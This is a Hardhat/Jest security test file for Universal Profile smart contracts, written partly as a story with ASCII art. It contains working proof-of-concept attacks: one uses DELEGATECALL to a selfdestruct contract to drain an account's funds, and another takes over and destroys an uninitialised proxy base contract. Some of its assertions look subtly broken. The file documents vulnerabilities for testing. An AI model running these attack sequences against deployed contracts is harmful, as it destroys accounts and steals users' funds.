import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { ethers } from "hardhat";

import {
  Destructor,
  Destructor__factory,
  KeyManager,
  KeyManager__factory,
  UniversalProfile,
  UniversalProfile__factory,
  UniversalProfileInit,
  UniversalProfileInit__factory,
} from "../build/types";

import { ALL_PERMISSIONS_SET, KEYS, OPERATIONS, PERMISSIONS } from "./utils/keymanager";
import { deployProxy, attachUniversalProfileProxy } from "./utils/proxy";

describe("Security related tests", () => {
  let provider = ethers.provider;

  let accounts: SignerWithAddress[] = [];

  // Standard version
  let universalProfile: UniversalProfile;
  let destructor: Destructor;

  // Proxy version
  let universalProfileBase: UniversalProfileInit;
  let proxyAccount;

  let owner, attacker: SignerWithAddress;

  let destructorPayload: string;

  describe.skip("Interacting via UP directly", () => {
    beforeAll(async () => {
      accounts = await ethers.getSigners();
      owner = accounts[0];
      attacker = accounts[1];

      universalProfile = await new UniversalProfile__factory(owner).deploy(owner.address);
      destructor = await new Destructor__factory(attacker).deploy();

      destructorPayload = destructor.interface.encodeFunctionData("doWork");
    });

    it("UP contract should contain some bytecode", async () => {
      let result = await provider.getCode(universalProfile.address);
      expect(result !== "0x");
    });

    it("Owner should be able to destroy its UP via DELEGATECALL", async () => {
      await universalProfile
        .connect(owner)
        .execute(OPERATIONS.DELEGATECALL, destructor.address, 0, destructorPayload);

      let result = await provider.getCode(universalProfile.address);
      expect(result !== "0x");
    });

    xit("should not be possible to call a function on the UP after destroying it", async () => {
      await universalProfile
        .connect(owner)
        .execute(OPERATIONS.DELEGATECALL, destructor.address, 0, destructorPayload);

      await universalProfile
        .connect(owner)
        .setData(
          [ethers.utils.keccak256(ethers.utils.toUtf8Bytes("Some key"))],
          [ethers.utils.hexlify(ethers.utils.toUtf8Bytes("some value"))]
        );
    });

    // function call to a non-contract account
  });

  describe.skip("Interacting via KeyManager", () => {
    let keyManager: KeyManager;

    beforeEach(async () => {
      accounts = await ethers.getSigners();
      owner = accounts[0];
      attacker = accounts[1];

      universalProfile = await new UniversalProfile__factory(owner).deploy(owner.address);
      destructor = await new Destructor__factory(attacker).deploy();

      destructorPayload = destructor.interface.encodeFunctionData("doWork");

      keyManager = await new KeyManager__factory(owner).deploy(universalProfile.address);

      // owner permissions
      await universalProfile
        .connect(owner)
        .setData(
          [KEYS.PERMISSIONS + owner.address.substr(2)],
          [ethers.utils.hexZeroPad(ALL_PERMISSIONS_SET, 32)]
        );

      // we call it `attacker` here to "recognize the caller in the code"
      // but this can be anyone with the DELEGATECALL permission
      await universalProfile
        .connect(owner)
        .setData(
          [KEYS.PERMISSIONS + attacker.address.substr(2)],
          [ethers.utils.hexZeroPad(PERMISSIONS.DELEGATECALL, 32)]
        );

      // switch account management to KeyManager
      await universalProfile.connect(owner).transferOwnership(keyManager.address);
    });

    it("anyone with permission DELEGATECALL might be able to destroy the UP", async () => {
      let maliciousPayload = universalProfile.interface.encodeFunctionData("execute", [
        OPERATIONS.DELEGATECALL,
        destructor.address,
        0,
        destructorPayload,
      ]);

      await keyManager.connect(attacker).execute(maliciousPayload);
      let result = await provider.getCode(universalProfile.address);

      expect(result).toEqual("0x");
    });

    it("attacker should have received all LYXs from UP after `selfdestruct`", async () => {
      await owner.sendTransaction({
        to: universalProfile.address,
        value: ethers.utils.parseEther("5"),
      });

      let initialUPBalance = await provider.getBalance(universalProfile.address);
      //   console.log("initialUPBalance: ", ethers.utils.formatEther(initialUPBalance));
      let initialAttackerBalance = await provider.getBalance(attacker.address);

      expect(initialUPBalance).toEqual(ethers.utils.parseEther("5"));

      let maliciousPayload = universalProfile.interface.encodeFunctionData("execute", [
        OPERATIONS.DELEGATECALL,
        destructor.address,
        0,
        destructorPayload,
      ]);

      await keyManager.connect(attacker).execute(maliciousPayload);

      let newUPBalance = await provider.getBalance(universalProfile.address);
      //   console.log("initialUPBalance: ", ethers.utils.formatEther(initialUPBalance));
      let newAttackerBalance = await provider.getBalance(attacker.address);

      expect(newUPBalance).toEqual(ethers.utils.parseEther("0"));

      //   console.log(initialAttackerBalance.add(initialUPBalance).toString());
      //   expect(newAttackerBalance).toEqual(ethers.utils.parseEther());
      //   let result = await provider.getCode(universalProfile.address);

      //   expect(result).toEqual("0x");
    });
  });

  describe.only(`
    Proxy Vulnerabilities: a little story 📖 about security on 🧑👩🤖👽 Universal Profile smart contracts
    (story written as Jest unit tests 🧪)
  `, () => {
    let abiCoder = ethers.utils.defaultAbiCoder;

    let destructor: Destructor;
    let destructorPayload: string;

    beforeAll(async () => {
      accounts = await ethers.getSigners();
      owner = accounts[0];
      attacker = accounts[1];

      universalProfileBase = await new UniversalProfileInit__factory(owner).deploy();
      let proxyAddress = await deployProxy(universalProfileBase.address, owner);

      proxyAccount = await attachUniversalProfileProxy(owner, proxyAddress);
      await proxyAccount.initialize(owner.address);

      destructor = await new Destructor__factory(attacker).deploy();
      destructorPayload = destructor.interface.encodeFunctionData("doWork");
    });

    it("📄0️⃣  Base contract owner should be (initially) address(0)", async () => {
      expect(await universalProfileBase.callStatic.owner()).toEqual(
        "0x0000000000000000000000000000000000000000"
      );
    });

    it("🎭👀 Attacker could then become the owner of the base contract, by calling `initialize` on it", async () => {
      await universalProfileBase.connect(attacker).initialize(attacker.address);
      expect(await universalProfileBase.owner()).toEqual(attacker.address);
    });

    it("😃🧑 In the meantime, users play with their UPs", async () => {
      let key = abiCoder.encode(["bytes32"], [ethers.utils.hexZeroPad("0xcafe", 32)]);
      let value = "0xbeef";

      let [initialValue] = await proxyAccount.callStatic.getData([key]);
      expect(initialValue).toEqual("0x");

      await proxyAccount.setData([key], [value]);

      let result = await proxyAccount.getData([key]);

      expect(result).toEqual([value]);
    });

    it(`when suddenly...
                                                              c=====e
                                                                  H
         ____________                                         _,,_H__
        (__((__((___()                                       //|     |
       (__((__((___()()_____________________________________// |ACME |
      (__((__((___()()()------------------------------------'  |_____|


                   _ ._  _ , _ ._
                 (_ ' ( \`  )_  .__)
               ( (  (    )   \`)  ) _)
              (__ (_   (_ . _) _) ,__)
                  \`~~\`\ ' . /\`~~\`
                        ;   ;
                        /   \\
          _____________/_ __ \\_____________


        The attacker 🧨 destroys the UP Base contract, by doing a DELEGATECALL 
        via the UP Base contract to a function in a contract that does \`selfDestruct\`
        (this will pass, because the attacker is now the contract owner)


    `, async () => {
      let me_do_some_damage = [
        OPERATIONS.DELEGATECALL,
        destructor.address,
        0,
        destructorPayload,
      ] as const;

      await universalProfileBase.connect(attacker).execute(...me_do_some_damage);

      // Bye bye UP Base
      let result = await provider.getCode(universalProfileBase.address);

      expect(result).toEqual("0x");
    });

    it(`
      💀🚫 And all the UP implementation as Proxies now don't work anymore
      (here in the test, trying to set some data on my Proxy UP, it reverts)
    `, async () => {
      let key = abiCoder.encode(["bytes32"], [ethers.utils.hexZeroPad("0xcafe", 32)]);
      let value = "0xbeef";

      let [initialValue] = await proxyAccount.callStatic.getData([key]);
      expect(initialValue).toEqual("0x");

      await proxyAccount.setData([key], [value]);

      let result = await proxyAccount.getData([key]);

      expect(result).toEqual([value]);
    });

    it(`
    ___________.__             ___________           .___
    \\__    ___/|  |__   ____   \\_   _____/ ____    __| _/
      |    |   |  |  \\_/ __ \\   |    __)_ /    \\  / __ | 
      |    |   |   Y  \\  ___/   |        \\   |  \\/ /_/ | 
      |____|   |___|  /\\___  > /_______  /___|  /\\____ | 
                    \\/     \\/          \\/     \\/      \\/ 
    `, () => {});
  });
});
